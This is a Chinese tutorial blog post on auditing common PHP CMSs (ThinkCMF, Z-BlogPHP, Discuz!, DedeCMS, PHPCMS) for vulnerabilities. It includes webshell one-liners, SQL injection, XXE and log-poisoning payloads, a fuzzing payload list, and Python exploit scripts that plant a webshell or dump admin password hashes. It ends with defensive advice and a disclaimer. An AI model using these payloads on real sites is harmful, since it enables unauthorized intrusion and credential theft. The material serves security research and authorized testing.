---
title: 常见CMS漏洞挖掘思路
date: 2026-06-10 08:00:00
tags:
  - 代码审计
  - 框架安全
  - 渗透测试
categories: 渗透测试
---

## 前言

CMS（内容管理系统）占据互联网网站绝大部分份额。由于开源、用户基数大、插件生态复杂，一直是安全研究的重点领域。本文整理国内常见CMS的漏洞挖掘思路与代码审计方法论，适合有PHP基础的安全从业者参考。

## 一、CMS代码审计通用方法论

### 1.1 环境搭建

获取完整源码后搭建本地调试环境：PHP 5.6/7.x + MySQL + Nginx，启用Xdebug进行动态调试，配合Seay源代码审计系统或Rips做初步扫描。对停止维护的老系统（DedeCMS），应保留多个历史版本做diff比对——很多漏洞从补丁对比中逆向发现。

### 1.2 入口文件与路由

每个CMS的入口文件是审计起点，重点分析：
- 常量定义与安全过滤机制（如`defined('IN_CMS') or exit`）
- 全局包含文件（common.php、global.func.php）
- 路由分发与MVC调度逻辑
- 全局WAF或输入过滤函数

```php
// 典型入口结构
define('APP_PATH', dirname(__FILE__) . '/');
include APP_PATH . 'config/config.php';
include APP_PATH . 'core/function.php';
```

### 1.3 关键函数定位

审计中优先搜索的危险函数：

| 类型 | 函数 |
|------|------|
| SQL操作 | mysql_query, mysqli_query, query, execute |
| 文件包含 | include, require, include_once |
| 文件读写 | file_get_contents, file_put_contents, fwrite |
| 命令执行 | system, exec, shell_exec, passthru |
| 代码执行 | eval, assert, preg_replace /e, create_function |
| 反序列化 | unserialize |
| SSRF | curl_exec, file_get_contents(URL) |

### 1.4 全局过滤绕过

大部分CMS在入口做全局过滤，分析绕过思路：

- **宽字节注入**：GBK下`%df%27`绕过addslashes
- **二次注入**：入库时转义，出库时未转义直接拼接
- **数组绕过**：过滤仅处理字符串，嵌套数组key值被忽略
- **编码差异**：UTF-8与GBK转换时的字符边界问题

---

## 二、ThinkCMF 漏洞挖掘

ThinkCMF基于ThinkPHP，MVC架构。核心目录：`app/`（应用）、`simplewind/cmf/`（框架）、`vendor/`（依赖）。

**模板注入GetShell**：后台"模板管理"中可编辑模板文件写入PHP代码：

```php
<php>@eval($_POST['cmd']);</php>
```

**SQL注入**：复杂查询中`field()`、`order()`、`group()`参数可能未绑定：

```php
$order = I('get.order');
$list = Db::name('article')->order($order)->select();
// payload: order=extractvalue(1,concat(0x7e,database()))
```

**缓存Key注入**：若缓存键名可控且支持`../`路径穿越，可写PHP到web可访问目录：

```php
cache('../upload/evil.php', '<?php @eval($_POST[1]);?>');
```

---

## 三、Z-BlogPHP 漏洞挖掘

Z-BlogPHP轻量级博客，核心安全较完善，但插件体系庞大，漏洞多集中于第三方插件。

**插件安装XXE**：在线安装插件时解析XML配置文件，可构造XXE读文件：

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<plugin>&xxe;</plugin>
```

**主题文件包含**：主题目录`zb_users/theme/`下若存在可控include点：

```php
$tpl = $_GET['tpl'];
include $tpl . '.php';  // 文件包含
```

**后台模块管理GetShell**：后台"新建模块"允许编写PHP代码保存为模块文件。审计重点在于是否存在权限绕过直接访问保存接口。

**XML-RPC未授权**：部分版本中XML-RPC接口结合`system.multicall`可构造复杂攻击链。

---

## 四、Discuz! 漏洞挖掘

Discuz!是使用最广泛的社区论坛，核心层安全性较高，漏洞集中于插件、模板和UCenter通信模块。

**UCenter通信密钥利用**：通过任意文件读取获取`config_ucenter.php`中`UC_KEY`后，可伪造UCenter通知实现getshell：

```php
$code = authcode('action=updateapps&...', 'ENCODE', UC_KEY);
// 目标: /api/uc.php?code=$code
```

**后台DIY模板GetShell**：门户 -> 模板管理 -> DIY模板支持直接编辑含PHP的模板。越权访问该接口即可getshell。

**插件钩子注入**：插件注册的全局钩子（`global_xxx`）在所有页面执行，若内部拼接SQL且参数可控：

```php
function global_xxx() {
    $var = $_GET['var'];
    DB::query("SELECT * FROM " . DB::table('xxx') . " WHERE id=$var");
}
```

---

## 五、DedeCMS 漏洞挖掘

DedeCMS已停更多年，但历史站点众多。代码风格老旧、全局过滤不完善，是漏洞高发区。

**变量覆盖**是最核心的安全问题（`include/common.inc.php`）：

```php
foreach($_REQUEST as $_k => $_v) {
    if(strlen($_k) > 0 && preg_match('/^(_|cfg_|GLOBALS)/', $_k)) exit;
    ${$_k} = _RunMagicQuotes($_v);
}
```

利用链：覆盖`$cfg_dbprefix`实现SQL注入、覆盖`$cfg_imgtype`绕过上传白名单。

**SQL注入**：大量语句用字符串拼接且未做类型转换：

```php
$id = $_GET['id'];
$query = "SELECT * FROM dede_archives WHERE id=$id";  // 数字型注入
```

**会员中心上传绕过**：利用双扩展名、截断、解析漏洞或头像上传点绕过。

---

## 六、PHPCMS V9 漏洞挖掘

MVC架构，核心库在`phpcms/`，全局函数在`phpcms/libs/functions/`。

**模板标签注入**：若标签参数可控且未校验，值被直接拼入SQL：

```html
{pc:content action="lists" catid="$catid"}
<!-- catid可控 => SQL注入 -->
```

**附件上传**：文件类型检查依赖扩展名白名单。绕过思路：寻找不在主上传模块管理的独立上传点、编辑器上传、SWFUpload组件缺陷。

**碎片管理GetShell**：后台"碎片管理"允许创建任意内容碎片，关注权限检查是否存在越权。

---

## 七、后台GetShell通用技术

**模板/主题编辑**（最直接）：需要绕过的障碍包括权限控制、CSRF Token、文件扩展名限制。通用payload：

```
file=../../../index.php&content=<?php @eval($_POST['cmd']);?>
```

**数据库备份**：备份为`.php`后缀，在数据中插入PHP代码；或备份路径可控写入web目录。

**缓存写入利用**：缓存文件多为PHP数组格式（`/cache`或`/data`目录），构造恶意缓存值可写入可执行代码。

**日志文件利用**：构造含PHP代码的URL触发日志记录，若日志为`.php`后缀则getshell。

```
GET /index.php?s=<?php phpinfo();?> HTTP/1.1
```

**定时任务**：后台创建计划任务指定远程脚本，实现远程文件包含执行。

---

## 八、插件与主题漏洞模式

插件是安全薄弱环节——开发者水平参差、审核不规范、更新不活跃。审计流程：

1. 定位插件入口文件（plugin.xml、index.php）
2. 追踪Hook/Filter注册回调函数
3. 检查独立权限验证是否依赖全局检查
4. 寻找独立请求入口绕过主程序安全机制

```php
// 典型不安全插件代码
if ($_GET['action'] == 'download') {
    $file = $_GET['file'];
    readfile($file);  // 未做权限检查 - 任意文件读取
}
```

主题漏洞类型：`include $_GET['tpl']`文件包含、路径穿越、存储型XSS、SSTI（模板引擎变量可控）。

---

## 九、SRC CMS漏洞挖掘实战

### 9.1 信息收集

- **Fingerprint识别**：robots.txt、admin路径特征、meta标签、HTTP头识别CMS类型
- **版本探测**：静态资源hash（CSS/JS）、readme、changelog获取精确版本
- **插件枚举**：`/plugins/`、`/zb_users/plugin/`等路径探测已安装插件

### 9.2 测试规范

- SQL注入使用时间盲注或MD5证明，避免update/insert
- 限定SRC授权范围，不越界
- 不删除或修改任何生产数据

### 9.3 高效策略

| 策略 | 效率 |
|------|------|
| 补丁对比（diff相邻版本定位修复点） | 高 |
| 历史漏洞复测（已知漏洞补丁绕过分析） | 中高 |
| 第三方组件（编辑器、文件管理器等） | 高 |
| 功能点Fuzzing（遍历参数注入payload） | 中 |
| 未授权接口扫描 | 中 |

### 9.4 Fuzzing字典关键词

```
# 文件类参数
file, path, dir, folder, url, src, template, theme, include

# 数据库类参数
id, catid, uid, pid, order, sort, field, keyword

# 执行类参数
action, method, do, callback, function, class

# 常用payload
' and 1=1--  |  ' union select 1,2,3--
../../../../etc/passwd
${@print(md5(1))}  |  {{7*7}}
```

---

## 十、实战代码示例

### ThinkCMF 缓存写入GetShell

```python
import requests

target = "http://target.com/"
s = requests.Session()
s.post(target + 'admin/public/login.html',
       data={'username': 'admin', 'password': 'admin123'})
s.post(target + 'admin/theme/set_cache.html',
       data={'name': '../upload/evil.php',
             'content': '<?php @eval($_POST["cmd"]);?>'})
print(f"[+] {target}upload/evil.php")
```

### DedeCMS 变量覆盖利用链

```python
import requests

# 覆盖数据库前缀实现注入读出管理员密码
params = {
    'cfg_dbprefix': "dede_' UNION SELECT 1,2,3,uname||0x3a||pwd FROM dede_admin#",
    'id': '1'
}
r = requests.get("http://target.com/plus/recommend.php", params=params)
```

### Discuz! UC_KEY 伪造通知

```python
import requests, base64, hashlib

def authcode(s, op, key):
    # 实现Discuz authcode加解密
    pass  # 具体实现略

# 利用已知UC_KEY伪造更新通知
code = authcode('action=updateapps&appid=1', 'ENCODE', UC_KEY)
requests.get(f'http://target.com/api/uc.php?code={code}')
```

---

## 十一、防御建议

**开发层面**：
- 统一输入过滤入口，参数化查询（PDO prepared statements）
- 文件路径使用白名单 + basename() 过滤
- 模板引擎关闭危险函数（Smarty `{php}` 标签）
- 上传双层校验：内容检测 + 扩展名白名单
- 关键操作增加CSRF Token和二次确认

**运维层面**：
- 及时更新CMS及插件，删除或限制访问 `/install/`
- 后台使用自定义路径配合IP白名单
- 严格配置文件权限，防 `config.php` 被读取
- 部署WAF作为最后防线

---

## 十二、免责声明

**本文所述技术仅供安全研究与授权测试使用。**

- 未经授权对目标系统进行渗透测试属于违法行为
- 使用者须遵守《中华人民共和国网络安全法》及相关法律法规
- 因滥用本文技术导致的一切法律后果由使用者自行承担
- 在SRC平台进行漏洞挖掘时，请严格遵守平台测试规范与授权范围

学习攻击技术的目的是为了更好防御。希望读者通过理解攻击面，提升自身安全防护能力。

---

## 参考资源

- ThinkCMF官方文档：https://www.thinkcmf.com/doc
- Z-BlogPHP开发文档：https://docs.zblogcn.com/
- Discuz!技术文库：https://open.discuz.net/
- OWASP Top 10：https://owasp.org/www-project-top-ten/
- 《PHP代码审计实战》—— 代码审计入门推荐
